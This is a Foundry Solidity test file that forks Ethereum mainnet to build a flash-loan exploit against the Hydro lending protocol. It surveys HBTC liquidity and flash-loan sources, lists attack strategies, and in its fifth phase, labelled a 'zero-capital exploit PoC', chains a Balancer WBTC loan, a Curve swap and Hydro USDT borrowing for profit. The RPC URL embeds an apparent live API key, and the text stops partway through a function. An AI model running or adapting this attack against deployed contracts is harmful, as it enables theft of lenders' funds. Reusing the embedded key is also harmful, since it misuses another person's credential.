// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

// ═══════════════════════════════════════════════════════════════════
// INTERFACE DEFINITIONS — every flash loan provider + DEX + Hydro
// ═══════════════════════════════════════════════════════════════════

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function allowance(address, address) external view returns (uint256);
}

// ── Aave V2 ──
interface IAaveV2LendingPool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,   // 0=no-debt (must repay), 1=stable, 2=variable
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;

    function FLASHLOAN_PREMIUM_TOTAL() external view returns (uint128);
}

interface IFlashLoanReceiver {
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}

// ── Aave V3 ──
interface IAaveV3Pool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata interestRateModes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;

    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;

    function FLASHLOAN_PREMIUM_TOTAL() external view returns (uint128);
}

// ── Balancer V2 ──
interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata userData
    ) external;
}

// ── dYdX SoloMargin ──
interface ISoloMargin {
    enum ActionType { Deposit, Withdraw, Transfer, Buy, Sell, Trade, Liquidate, Vaporize, Call }

    struct ActionArgs {
        ActionType actionType;
        uint256 accountId;
        AssetAmount amount;
        uint256 primaryMarketId;
        uint256 secondaryMarketId;
        address otherAddress;
        uint256 otherAccountId;
        bytes data;
    }

    struct AssetAmount {
        bool sign;
        uint8 denomination; // 0=Wei, 1=Par
        uint8 ref;          // 0=Delta, 1=Target
        uint256 value;
    }

    struct AccountInfo {
        address owner;
        uint256 number;
    }

    function operate(AccountInfo[] calldata accounts, ActionArgs[] calldata actions) external;
    function getNumMarkets() external view returns (uint256);
    function getMarketTokenAddress(uint256 marketId) external view returns (address);
}

interface ICallee {
    function callFunction(address sender, ISoloMargin.AccountInfo calldata accountInfo, bytes calldata data) external;
}

// ── Uniswap V2 ──
interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

// ── Uniswap V3 ──
interface IUniswapV3Factory {
    function getPool(address tokenA, address tokenB, uint24 fee) external view returns (address pool);
}

interface IUniswapV3Pool {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function fee() external view returns (uint24);
    function liquidity() external view returns (uint128);
    function slot0() external view returns (
        uint160 sqrtPriceX96,
        int24 tick,
        uint16 observationIndex,
        uint16 observationCardinality,
        uint16 observationCardinalityNext,
        uint8 feeProtocol,
        bool unlocked
    );
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IUniswapV3FlashCallback {
    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external;
}

// ── Uniswap V3 Router (for swaps) ──
interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }
    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);

    struct ExactOutputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountOut;
        uint256 amountInMaximum;
        uint160 sqrtPriceLimitX96;
    }
    function exactOutputSingle(ExactOutputSingleParams calldata params) external payable returns (uint256 amountIn);
}

// ── Curve ──
interface ICurvePool {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external; // old pools: no return
    function get_dy(int128 i, int128 j, uint256 dx) external view returns (uint256);
    function coins(uint256 i) external view returns (address);
    function balances(uint256 i) external view returns (uint256);
}

// ── Sushiswap ──
interface ISushiFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

// ── Hydro ──
interface IHydro {
    function getAssetOraclePrice(address assetAddress) external view returns (uint256);
    function getMarket(uint16 marketID) external view returns (
        address baseAsset,
        address quoteAsset,
        uint256 liquidateRate,
        uint256 withdrawRate,
        uint256 auctionRatioStart,
        uint256 auctionRatioPerBlock,
        bool borrowEnable
    );
    function getAllMarketsCount() external view returns (uint256);
    function getTotalSupply(address asset) external view returns (uint256);
    function getTotalBorrow(address asset) external view returns (uint256);
    function getPoolCashableAmount(address asset) external view returns (uint256);
    function balanceOf(address asset, address user) external view returns (uint256);
}

// ═══════════════════════════════════════════════════════════════════
// TEST CONTRACT — Comprehensive Flash Loan Investigation
// ═══════════════════════════════════════════════════════════════════

contract HydroFlashLoanChain is Test {

    // ── Core addresses ──
    address constant HYDRO       = 0x241e82C79452F51fbfc89Fac6d912e021dB1a3B7;
    address constant HBTC        = 0x0316EB71485b0Ab14103307bf65a021042c6d380;
    address constant WBTC        = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant USDT        = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant USDC        = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant WETH        = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant DAI         = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    // ── Flash loan providers ──
    address constant AAVE_V2_POOL    = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
    address constant AAVE_V3_POOL    = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address constant BALANCER_VAULT  = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address constant DYDX_SOLO       = 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e;

    // ── DEX infrastructure ──
    address constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address constant UNISWAP_V3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;
    address constant SUSHI_FACTORY      = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address constant UNISWAP_V3_ROUTER  = 0xE592427A0AEce92De3Edee1F18E0157C05861564;

    // ── Curve pools ──
    address constant CURVE_HBTC_POOL = 0x4CA9b3063Ec5866A4B82E437059D2C43d1be596F;

    // ── Hydro market ──
    uint16 constant MARKET_HBTC_USDT = 5;

    // Hydro batch
    struct Action {
        uint8 actionType;
        bytes encodedParams;
    }
    bytes4 constant BATCH_SEL = bytes4(keccak256("batch((uint8,bytes)[])"));

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/pLXdY7rYRY10SH_UTLBGH");
    }

    // ═══════════════════════════════════════════════════════════════
    // PHASE 1: Map all HBTC liquidity sources
    // ═══════════════════════════════════════════════════════════════

    function test_01_map_hbtc_liquidity() public view {
        console.log("==========================================================");
        console.log("  PHASE 1: HBTC LIQUIDITY MAP (all sources)");
        console.log("==========================================================");

        // HBTC token info
        uint256 hbtcTotalSupply = IERC20(HBTC).totalSupply();
        uint8 hbtcDecimals = IERC20(HBTC).decimals();
        console.log("HBTC total supply:", hbtcTotalSupply / 1e18);
        console.log("HBTC decimals:", hbtcDecimals);

        // ── 1. Curve HBTC/WBTC pool ──
        console.log("\n--- Curve HBTC/WBTC Pool (0x4CA9...) ---");
        uint256 curveHBTC = IERC20(HBTC).balanceOf(CURVE_HBTC_POOL);
        uint256 curveWBTC = IERC20(WBTC).balanceOf(CURVE_HBTC_POOL);
        console.log("  HBTC in pool:", curveHBTC / 1e18, ".", (curveHBTC % 1e18) / 1e15);
        console.log("  WBTC in pool (sats):", curveWBTC);
        console.log("  WBTC in pool:", curveWBTC / 1e8, "WBTC");

        // Curve exchange rates
        if (curveHBTC > 0) {
            // Try getting dy for 1 WBTC -> HBTC
            // Curve hbtc pool: coin 0 = HBTC, coin 1 = WBTC
            try ICurvePool(CURVE_HBTC_POOL).get_dy(int128(1), int128(0), 1e8) returns (uint256 hbtcOut) {
                console.log("  1 WBTC -> HBTC (wei):", hbtcOut);
                console.log("  1 WBTC -> HBTC:", hbtcOut / 1e18);
            } catch {
                console.log("  get_dy(WBTC->HBTC) failed");
            }
            // And reverse: 1 HBTC -> WBTC
            try ICurvePool(CURVE_HBTC_POOL).get_dy(int128(0), int128(1), 1e18) returns (uint256 wbtcOut) {
                console.log("  1 HBTC -> WBTC (sats):", wbtcOut);
                console.log("  1 HBTC -> WBTC pct:", wbtcOut * 100 / 1e8);
            } catch {
                console.log("  get_dy(HBTC->WBTC) failed");
            }
        }

        // ── 2. Uniswap V2 HBTC pairs ──
        console.log("\n--- Uniswap V2 HBTC Pairs ---");
        _checkV2Pair("HBTC/WBTC", HBTC, WBTC);
        _checkV2Pair("HBTC/WETH", HBTC, WETH);
        _checkV2Pair("HBTC/USDT", HBTC, USDT);
        _checkV2Pair("HBTC/USDC", HBTC, USDC);
        _checkV2Pair("HBTC/DAI",  HBTC, DAI);

        // ── 3. Sushiswap HBTC pairs ──
        console.log("\n--- Sushiswap HBTC Pairs ---");
        _checkSushiPair("HBTC/WBTC", HBTC, WBTC);
        _checkSushiPair("HBTC/WETH", HBTC, WETH);
        _checkSushiPair("HBTC/USDT", HBTC, USDT);

        // ── 4. Uniswap V3 HBTC pools ──
        console.log("\n--- Uniswap V3 HBTC Pools ---");
        uint24[4] memory fees = [uint24(100), uint24(500), uint24(3000), uint24(10000)];
        address[4] memory counterparts = [WBTC, WETH, USDT, USDC];
        string[4] memory names = ["WBTC", "WETH", "USDT", "USDC"];

        for (uint i = 0; i < counterparts.length; i++) {
            for (uint j = 0; j < fees.length; j++) {
                address pool = IUniswapV3Factory(UNISWAP_V3_FACTORY).getPool(HBTC, counterparts[i], fees[j]);
                if (pool != address(0)) {
                    uint128 liq = IUniswapV3Pool(pool).liquidity();
                    uint256 hbtcBal = IERC20(HBTC).balanceOf(pool);
                    uint256 otherBal = IERC20(counterparts[i]).balanceOf(pool);
                    console.log("  V3 HBTC/", names[i], "fee:", fees[j]);
                    console.log("    pool:", pool);
                    console.log("    liquidity:", liq);
                    console.log("    HBTC:", hbtcBal / 1e18);
                    console.log("    other:", otherBal);
                }
            }
        }

        // ── 5. Balancer HBTC balance check ──
        console.log("\n--- Balancer Vault HBTC ---");
        uint256 balancerHBTC = IERC20(HBTC).balanceOf(BALANCER_VAULT);
        console.log("  HBTC in Balancer Vault:", balancerHBTC / 1e18);

        // ── 6. Known HBTC holders (check balances) ──
        console.log("\n--- Known HBTC Holders ---");
        address[5] memory knownHolders = [
            CURVE_HBTC_POOL,
            HYDRO,
            0x0000000000000000000000000000000000000000,  // burn address
            0x000000000000000000000000000000000000dEaD,  // dead
            address(0x0316EB71485b0Ab14103307bf65a021042c6d380) // HBTC contract itself
        ];
        for (uint i = 0; i < knownHolders.length; i++) {
            if (knownHolders[i] != address(0)) {
                uint256 bal = IERC20(HBTC).balanceOf(knownHolders[i]);
                if (bal > 0) {
                    console.log("  holder:", knownHolders[i]);
                    console.log("    HBTC:", bal / 1e18, ".", (bal % 1e18) / 1e15);
                }
            }
        }

        // ── 7. Hydro state ──
        console.log("\n--- Hydro Protocol State ---");
        uint256 hydroUSDT = IERC20(USDT).balanceOf(HYDRO);
        uint256 hydroHBTC = IERC20(HBTC).balanceOf(HYDRO);
        uint256 hydroWBTC = IERC20(WBTC).balanceOf(HYDRO);
        console.log("  USDT in Hydro:", hydroUSDT / 1e6);
        console.log("  HBTC in Hydro:", hydroHBTC / 1e18);
        console.log("  WBTC in Hydro:", hydroWBTC);

        // Oracle prices
        try IHydro(HYDRO).getAssetOraclePrice(HBTC) returns (uint256 hbtcPrice) {
            console.log("  HBTC oracle price:", hbtcPrice / 1e18, "USD");
        } catch {}
        try IHydro(HYDRO).getAssetOraclePrice(USDT) returns (uint256 usdtPrice) {
            console.log("  USDT oracle price:", usdtPrice / 1e18, "USD");
        } catch {}

        // Market count
        try IHydro(HYDRO).getAllMarketsCount() returns (uint256 count) {
            console.log("  Total markets:", count);
        } catch {}

        // USDT pool state
        try IHydro(HYDRO).getTotalSupply(USDT) returns (uint256 supply) {
            console.log("  USDT total supply (pool):", supply / 1e6);
        } catch {}
        try IHydro(HYDRO).getTotalBorrow(USDT) returns (uint256 borrow) {
            console.log("  USDT total borrow:", borrow / 1e6);
        } catch {}
    }

    function _checkV2Pair(string memory name, address t0, address t1) internal view {
        address pair = IUniswapV2Factory(UNISWAP_V2_FACTORY).getPair(t0, t1);
        if (pair != address(0)) {
            (uint112 r0, uint112 r1,) = IUniswapV2Pair(pair).getReserves();
            console.log("  V2", name, "pair:", pair);
            console.log("    reserves:", r0, "/", r1);
        } else {
            console.log("  V2", name, ": NO PAIR");
        }
    }

    function _checkSushiPair(string memory name, address t0, address t1) internal view {
        try ISushiFactory(SUSHI_FACTORY).getPair(t0, t1) returns (address pair) {
            if (pair != address(0)) {
                (uint112 r0, uint112 r1,) = IUniswapV2Pair(pair).getReserves();
                console.log("  Sushi", name, "pair:", pair);
                console.log("    reserves:", r0, "/", r1);
            } else {
                console.log("  Sushi", name, ": NO PAIR");
            }
        } catch {
            console.log("  Sushi", name, ": FACTORY CALL FAILED");
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // PHASE 2: Query flash loan provider capacities for WBTC
    // ═══════════════════════════════════════════════════════════════

    function test_02_flash_loan_providers() public view {
        console.log("==========================================================");
        console.log("  PHASE 2: FLASH LOAN PROVIDER CAPACITIES");
        console.log("==========================================================");

        // ── Aave V2 ──
        console.log("\n--- Aave V2 ---");
        uint256 aaveV2WBTC = IERC20(WBTC).balanceOf(0x9ff58f4fFB29fA2266Ab25e75e2A8b3503311656); // aWBTC
        console.log("  aWBTC (Aave V2) sats:", aaveV2WBTC);
        console.log("  aWBTC (Aave V2) WBTC:", aaveV2WBTC / 1e8);
        try IAaveV2LendingPool(AAVE_V2_POOL).FLASHLOAN_PREMIUM_TOTAL() returns (uint128 premium) {
            console.log("  Flash premium (bps):", premium);
        } catch {
            console.log("  Flash premium query failed");
        }

        uint256 aaveV2USDT = IERC20(USDT).balanceOf(0x3Ed3B47Dd13EC9a98b44e6204A523E766B225811); // aUSDT
        console.log("  aUSDT (Aave V2) balance:", aaveV2USDT / 1e6, "USDT");

        // ── Aave V3 ──
        console.log("\n--- Aave V3 ---");
        uint256 aaveV3WBTC = IERC20(WBTC).balanceOf(0x5Ee5bf7ae06D1Be5997A1A72006FE6C607eC6DE8); // aEthWBTC
        console.log("  aWBTC (Aave V3) sats:", aaveV3WBTC);
        console.log("  aWBTC (Aave V3) WBTC:", aaveV3WBTC / 1e8);
        try IAaveV3Pool(AAVE_V3_POOL).FLASHLOAN_PREMIUM_TOTAL() returns (uint128 premium) {
            console.log("  Flash premium:", premium, "bps");
        } catch {
            console.log("  Flash premium query failed");
        }

        // ── Balancer V2 ──
        console.log("\n--- Balancer V2 (fee-free flash loans!) ---");
        uint256 balancerWBTC = IERC20(WBTC).balanceOf(BALANCER_VAULT);
        uint256 balancerUSDT = IERC20(USDT).balanceOf(BALANCER_VAULT);
        uint256 balancerWETH = IERC20(WETH).balanceOf(BALANCER_VAULT);
        uint256 balancerUSDC = IERC20(USDC).balanceOf(BALANCER_VAULT);
        console.log("  WBTC sats:", balancerWBTC);
        console.log("  WBTC:", balancerWBTC / 1e8);
        console.log("  USDT:", balancerUSDT / 1e6, "USDT");
        console.log("  WETH:", balancerWETH / 1e18, "WETH");
        console.log("  USDC:", balancerUSDC / 1e6, "USDC");
        console.log("  NOTE: Balancer flash loans are FEE-FREE!");

        // ── dYdX ──
        console.log("\n--- dYdX Solo Margin ---");
        uint256 dydxWETH = IERC20(WETH).balanceOf(DYDX_SOLO);
        uint256 dydxUSDC = IERC20(USDC).balanceOf(DYDX_SOLO);
        uint256 dydxDAI  = IERC20(DAI).balanceOf(DYDX_SOLO);
        console.log("  WETH:", dydxWETH / 1e18, "WETH");
        console.log("  USDC:", dydxUSDC / 1e6, "USDC");
        console.log("  DAI:", dydxDAI / 1e18, "DAI");
        console.log("  NOTE: dYdX flash loans are FEE-FREE (repay same amount)!");

        // ── Uniswap V3 WBTC pools (can flash) ──
        console.log("\n--- Uniswap V3 WBTC Pools (can flash) ---");
        address wbtcWethPool500 = IUniswapV3Factory(UNISWAP_V3_FACTORY).getPool(WBTC, WETH, 500);
        address wbtcWethPool3000 = IUniswapV3Factory(UNISWAP_V3_FACTORY).getPool(WBTC, WETH, 3000);
        address wbtcUsdtPool3000 = IUniswapV3Factory(UNISWAP_V3_FACTORY).getPool(WBTC, USDT, 3000);
        address wbtcUsdcPool3000 = IUniswapV3Factory(UNISWAP_V3_FACTORY).getPool(WBTC, USDC, 3000);

        if (wbtcWethPool500 != address(0)) {
            console.log("  V3 WBTC/WETH 500bp:", wbtcWethPool500);
            console.log("    WBTC:", IERC20(WBTC).balanceOf(wbtcWethPool500) / 1e8);
        }
        if (wbtcWethPool3000 != address(0)) {
            console.log("  V3 WBTC/WETH 3000bp:", wbtcWethPool3000);
            console.log("    WBTC:", IERC20(WBTC).balanceOf(wbtcWethPool3000) / 1e8);
        }
        if (wbtcUsdtPool3000 != address(0)) {
            console.log("  V3 WBTC/USDT 3000bp:", wbtcUsdtPool3000);
            console.log("    WBTC:", IERC20(WBTC).balanceOf(wbtcUsdtPool3000) / 1e8);
        }
        if (wbtcUsdcPool3000 != address(0)) {
            console.log("  V3 WBTC/USDC 3000bp:", wbtcUsdcPool3000);
            console.log("    WBTC:", IERC20(WBTC).balanceOf(wbtcUsdcPool3000) / 1e8);
        }

        // ── Uniswap V2 WBTC/WETH pair (flash swap) ──
        console.log("\n--- Uniswap V2 WBTC Pairs (flash swap) ---");
        address v2WbtcWeth = IUniswapV2Factory(UNISWAP_V2_FACTORY).getPair(WBTC, WETH);
        if (v2WbtcWeth != address(0)) {
            (uint112 r0, uint112 r1,) = IUniswapV2Pair(v2WbtcWeth).getReserves();
            console.log("  V2 WBTC/WETH:", v2WbtcWeth);
            console.log("    reserves:", r0, "/", r1);
        }

        // ── Maker flash mint (DAI only) ──
        console.log("\n--- Maker Flash Mint ---");
        console.log("  DssFlash: can mint up to 500M DAI with 0 fee");
        console.log("  Address: 0x1EB4CF3A948E7D72A198fe073cCb8C7a948cD853");
    }

    // ═══════════════════════════════════════════════════════════════
    // PHASE 3: Hydro market parameters deep dive
    // ═══════════════════════════════════════════════════════════════

    function test_03_hydro_market_deep_dive() public view {
        console.log("==========================================================");
        console.log("  PHASE 3: HYDRO MARKET PARAMETERS");
        console.log("==========================================================");

        // All markets
        uint256 marketCount;
        try IHydro(HYDRO).getAllMarketsCount() returns (uint256 c) {
            marketCount = c;
            console.log("Total markets:", c);
        } catch {
            console.log("Failed to get market count");
            return;
        }

        // Dump all markets to find HBTC ones
        for (uint16 i = 0; i < marketCount && i < 20; i++) {
            try IHydro(HYDRO).getMarket(i) returns (
                address baseAsset,
                address quoteAsset,
                uint256 liquidateRate,
                uint256 withdrawRate,
                uint256 auctionRatioStart,
                uint256 auctionRatioPerBlock,
                bool borrowEnable
            ) {
                console.log("\n  Market", i, ":");
                console.log("    base:", baseAsset);
                console.log("    quote:", quoteAsset);
                console.log("    liquidateRate pct:", liquidateRate / 1e16);
                console.log("    liquidateRate raw:", liquidateRate);
                console.log("    withdrawRate pct:", withdrawRate / 1e16);
                console.log("    withdrawRate raw:", withdrawRate);
                console.log("    borrowEnable:", borrowEnable);

                // Check if this involves HBTC
                if (baseAsset == HBTC || quoteAsset == HBTC) {
                    console.log("    *** HBTC MARKET FOUND ***");

                    // Check available liquidity
                    if (quoteAsset == USDT || baseAsset == USDT) {
                        uint256 usdtAvail = IERC20(USDT).balanceOf(HYDRO);
                        console.log("    USDT available:", usdtAvail / 1e6);
                    }
                }
            } catch {
                // Market might not exist at this ID
            }
        }

        // Oracle prices for key assets
        console.log("\n--- Oracle Prices ---");
        address[4] memory assets = [HBTC, WBTC, USDT, WETH];
        string[4] memory assetNames = ["HBTC", "WBTC", "USDT", "WETH"];
        for (uint i = 0; i < assets.length; i++) {
            try IHydro(HYDRO).getAssetOraclePrice(assets[i]) returns (uint256 price) {
                console.log("  Asset:", assetNames[i]);
                console.log("    price USD:", price / 1e18);
                console.log("    price raw:", price);
            } catch {
                console.log("  ", assetNames[i], ": not registered");
            }
        }

        // Lending pool stats
        console.log("\n--- Lending Pool Stats ---");
        try IHydro(HYDRO).getTotalSupply(USDT) returns (uint256 s) {
            console.log("  USDT pool supply:", s / 1e6);
        } catch {}
        try IHydro(HYDRO).getTotalBorrow(USDT) returns (uint256 b) {
            console.log("  USDT pool borrow:", b / 1e6);
        } catch {}
        try IHydro(HYDRO).getPoolCashableAmount(USDT) returns (uint256 c) {
            console.log("  USDT cashable:", c / 1e6);
        } catch {}
    }

    // ═══════════════════════════════════════════════════════════════
    // PHASE 4: Simulate the optimal flash loan chain
    // Calculate profit for each path WITHOUT executing
    // ═══════════════════════════════════════════════════════════════

    function test_04_simulate_optimal_chain() public view {
        console.log("==========================================================");
        console.log("  PHASE 4: OPTIMAL FLASH LOAN CHAIN SIMULATION");
        console.log("==========================================================");

        // Current prices and rates
        uint256 hbtcOraclePrice;
        try IHydro(HYDRO).getAssetOraclePrice(HBTC) returns (uint256 p) {
            hbtcOraclePrice = p;
        } catch {
            console.log("Cannot get HBTC oracle price");
            return;
        }

        uint256 usdtOraclePrice;
        try IHydro(HYDRO).getAssetOraclePrice(USDT) returns (uint256 p) {
            usdtOraclePrice = p;
        } catch {
            console.log("Cannot get USDT oracle price");
            return;
        }

        console.log("HBTC oracle price (USD):", hbtcOraclePrice / 1e18);
        console.log("USDT oracle price (USD):", usdtOraclePrice / 1e18);

        // Available HBTC on Curve
        uint256 curveHBTC = IERC20(HBTC).balanceOf(CURVE_HBTC_POOL);
        console.log("Curve pool HBTC:", curveHBTC / 1e18, ".", (curveHBTC % 1e18) / 1e15);

        // Hydro USDT available
        uint256 hydroUSDT = IERC20(USDT).balanceOf(HYDRO);
        console.log("Hydro USDT:", hydroUSDT / 1e6);

        // How much HBTC we can get from swapping WBTC on Curve
        // Try different WBTC amounts
        console.log("\n--- Curve WBTC->HBTC swap simulation ---");
        uint256[5] memory wbtcAmounts = [uint256(0.1e8), 0.5e8, 1e8, 2e8, 5e8];
        for (uint i = 0; i < wbtcAmounts.length; i++) {
            try ICurvePool(CURVE_HBTC_POOL).get_dy(int128(1), int128(0), wbtcAmounts[i]) returns (uint256 hbtcOut) {
                uint256 maxBorrow = hbtcOut * hbtcOraclePrice / usdtOraclePrice / 1e18; // rough borrow capacity
                // Apply ~80% LTV (liquidateRate)
                uint256 safeBorrow = maxBorrow * 80 / 100;
                console.log("  WBTC in (sats):", wbtcAmounts[i]);
                console.log("  HBTC out (wei):", hbtcOut);
                console.log("    Max borrow (80% LTV):", safeBorrow / 1e6, "USDT");
                console.log("    Flash loan cost (0.09% Aave V2):", wbtcAmounts[i] * 9 / 10000, "WBTC (in sats)");
            } catch {
                console.log("  ", wbtcAmounts[i] / 1e8, "WBTC: INSUFFICIENT LIQUIDITY");
            }
        }

        // ── Strategy A: Flash borrow WBTC from Balancer (FREE), swap to HBTC, exploit Hydro ──
        console.log("\n=== STRATEGY A: Balancer WBTC flash (free) -> Curve swap -> Hydro ===");
        uint256 balancerWBTC = IERC20(WBTC).balanceOf(BALANCER_VAULT);
        console.log("Balancer WBTC available:", balancerWBTC / 1e8, "WBTC");
        console.log("Strategy: borrow WBTC (0 fee) -> swap on Curve -> deposit HBTC -> borrow USDT -> swap USDT->WBTC -> repay");
        console.log("Constraint: limited by Curve HBTC pool depth and Hydro USDT");

        // ── Strategy B: Flash borrow USDT from Balancer -> buy HBTC -> exploit Hydro -> repay ──
        console.log("\n=== STRATEGY B: Balancer USDT flash (free) -> buy HBTC -> Hydro -> repay ===");
        uint256 balancerUSDT = IERC20(USDT).balanceOf(BALANCER_VAULT);
        console.log("Balancer USDT available:", balancerUSDT / 1e6, "USDT");

        // ── Strategy C: Multi-provider chain for maximum capital ──
        console.log("\n=== STRATEGY C: Multi-provider flash loan chain ===");
        console.log("1. Balancer flash WBTC (free) -> swap to HBTC on Curve");
        console.log("2. Deposit HBTC to Hydro, borrow USDT");
        console.log("3. Use USDT to buy WBTC on Uniswap V3 to repay Balancer");
        console.log("4. Keep remaining USDT as profit");

        // ── Strategy D: dYdX + Balancer double flash ──
        console.log("\n=== STRATEGY D: dYdX WETH (free) + Balancer WBTC (free) ===");
        uint256 dydxWETH = IERC20(WETH).balanceOf(DYDX_SOLO);
        console.log("dYdX WETH:", dydxWETH / 1e18);
        console.log("Use WETH->WBTC swap + direct Balancer WBTC flash for maximum WBTC");

        // ── Strategy E: Uniswap V2 flash swap WBTC directly ──
        console.log("\n=== STRATEGY E: Uniswap V2 flash swap ===");
        address v2WbtcWeth = IUniswapV2Factory(UNISWAP_V2_FACTORY).getPair(WBTC, WETH);
        if (v2WbtcWeth != address(0)) {
            (uint112 r0, uint112 r1,) = IUniswapV2Pair(v2WbtcWeth).getReserves();
            console.log("V2 WBTC/WETH reserves:", r0, "/", r1);
            console.log("Flash swap fee: 0.3%");
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // PHASE 5: EXECUTE — Balancer Flash Loan (FREE!) -> Full Chain
    // This is the actual zero-capital exploit PoC
    // ═══════════════════════════════════════════════════════════════

    function test_05_balancer_flash_full_chain() public {
        console.log("==========================================================");
        console.log("  PHASE 5: BALANCER FLASH -> CURVE SWAP -> HYDRO EXPLOIT");
        console.log("==========================================================");

        uint256 usdtBefore = IERC20(USDT).balanceOf(address(this));
        uint256 wbtcBefore = IERC20(WBTC).balanceOf(address(this));
        console.log("USDT before:", usdtBefore);
        console.log("WBTC before:", wbtcBefore);

        // Determine max HBTC we can get from Curve
        uint256 curveHBTC = IERC20(HBTC).balanceOf(CURVE_HBTC_POOL);
        console.log("Curve HBTC available:", curveHBTC / 1e18);

        // We want to flash borrow enough WBTC to buy most of the HBTC in Curve
        // Start with 1 WBTC to be conservative
        uint256 flashWBTC = 1e8; // 1 WBTC

        // Try to get dy to size our flash
        try ICurvePool(CURVE_HBTC_POOL).get_dy(int128(1), int128(0), flashWBTC) returns (uint256 hbtcExpected) {
            console.log("Expected HBTC from 1 WBTC:", hbtcExpected / 1e18);

            if (hbtcExpected < 0.5e18) {
                console.log("SKIP: Not enough HBTC liquidity for profitable swap");
                return;
            }
        } catch {
            console.log("SKIP: Curve get_dy failed");
            return;
        }

        // Execute flash loan from Balancer (0 fee!)
        address[] memory tokens = new address[](1);
        tokens[0] = WBTC;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = flashWBTC;

        bytes memory userData = abi.encode(uint8(1)); // strategy identifier

        console.log("\nExecuting Balancer flash loan for", flashWBTC / 1e8, "WBTC...");

        IBalancerVault(BALANCER_VAULT).flashLoan(
            address(this),
            tokens,
            amounts,
            userData
        );

        // Results
        uint256 usdtAfter = IERC20(USDT).balanceOf(address(this));
        uint256 wbtcAfter = IERC20(WBTC).balanceOf(address(this));
        uint256 hbtcAfter = IERC20(HBTC).balanceOf(address(this));

        console.log("\n=== RESULTS ===");
        console.log("USDT gained:", (usdtAfter - usdtBefore) / 1e6);
        console.log("WBTC remaining:", wbtcAfter);
        console.log("HBTC remaining:", hbtcAfter);
        console.log("NET PROFIT (USDT):", (usdtAfter - usdtBefore) / 1e6);
        console.log("ATTACKER CAPITAL REQUIRED: ZERO");
    }

    // ═══════════════════════════════════════════════════════════════
    // Balancer flash loan callback
    // ═══════════════════════════════════════════════════════════════
    function receiveFlashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata userData
    ) external {
        require(msg.sender == BALANCER_VAULT, "not balancer");

        uint8 strategy = abi.decode(userData, (uint8));
        console.log("  Flash loan callback, strategy:", strategy);
        console.log("  Received WBTC:", amounts[0] / 1e8);
        console.log("  Fee:", feeAmounts[0]); // Should be 0 for Balancer

        if (strategy == 1) {
            _executeStrategyA(amounts[0]);
        } else if (strategy == 2) {
            _executeStrategyMultiHBTC(amounts[0]);
        }

        // Repay Balancer: transfer back WBTC (same amount, no fee)
        IERC20(WBTC).transfer(BALANCER_VAULT, amounts[0] + feeAmounts[0]);
        console.log("  Repaid Balancer WBTC:", (amounts[0] + feeAmounts[0]) / 1e8);
    }

    // ── Strategy A: WBTC -> Curve HBTC -> Hydro borrow USDT -> Uniswap buy WBTC ──
    function _executeStrategyA(uint256 wbtcAmount) internal {
        console.log("\n  --- Strategy A Execution ---");

        // Step 1: Swap WBTC -> HBTC on Curve (old pool: no return value)
        uint256 hbtcBefore = IERC20(HBTC).balanceOf(address(this));
        IERC20(WBTC).approve(CURVE_HBTC_POOL, wbtcAmount);
        ICurvePool(CURVE_HBTC_POOL).exchange(int128(1), int128(0), wbtcAmount, 0);
        uint256 hbtcReceived = IERC20(HBTC).balanceOf(address(this)) - hbtcBefore;
